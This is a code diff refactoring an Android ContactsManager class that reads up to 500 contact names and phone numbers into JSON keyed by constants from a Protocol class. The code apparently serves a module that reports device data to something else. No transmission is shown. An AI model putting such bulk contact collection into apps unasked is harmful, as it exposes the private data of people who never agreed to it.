@@ -5,26 +5,27 @@ import android.database.Cursor;
 import android.provider.ContactsContract.CommonDataKinds.Phone;
 
 import com.fason.app.core.FasonApp;
+import com.fason.app.core.Protocol;
 import com.fason.app.core.permissions.PermissionManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-// Contacts manager
 public final class ContactsManager {
+
+    private static final int MAX = 500;
 
     private ContactsManager() {}
 
-    // Get contacts list
     public static JSONObject getContacts() {
         JSONObject result = new JSONObject();
         JSONArray list = new JSONArray();
 
         try {
-            result.put("contactsList", list);
+            result.put(Protocol.KEY_CONTACTS_LIST, list);
 
             if (!PermissionManager.canIUse(Manifest.permission.READ_CONTACTS)) {
-                result.put("error", "Permission denied");
+                result.put(Protocol.KEY_ERROR, "Permission denied");
                 return result;
             }
 
@@ -35,18 +36,28 @@ public final class ContactsManager {
                 Phone.DISPLAY_NAME + " ASC");
 
             if (cur != null) {
-                int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
-                int numIdx = cur.getColumnIndex(Phone.NUMBER);
+                try {
+                    int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
+                    int numIdx = cur.getColumnIndex(Phone.NUMBER);
+                    int count = 0;
 
-                while (cur.moveToNext()) {
-                    JSONObject c = new JSONObject();
-                    if (nameIdx >= 0) c.put("name", cur.getString(nameIdx));
-                    if (numIdx >= 0) c.put("phoneNo", cur.getString(numIdx));
-                    list.put(c);
+                    while (cur.moveToNext() && count < MAX) {
+                        String name = nameIdx >= 0 ? cur.getString(nameIdx) : "";
+                        String phoneNo = numIdx >= 0 ? cur.getString(numIdx) : "";
+
+                        if (name.isEmpty() && phoneNo.isEmpty()) continue;
+
+                        JSONObject c = new JSONObject();
+                        c.put(Protocol.KEY_NAME, name);
+                        c.put(Protocol.KEY_PHONE_NO, phoneNo);
+                        list.put(c);
+                        count++;
+                    }
+                } finally {
+                    cur.close();
                 }
-                cur.close();
             }
-            result.put("total", list.length());
+            result.put(Protocol.KEY_TOTAL, list.length());
         } catch (Exception ignored) {}
 
         return result;
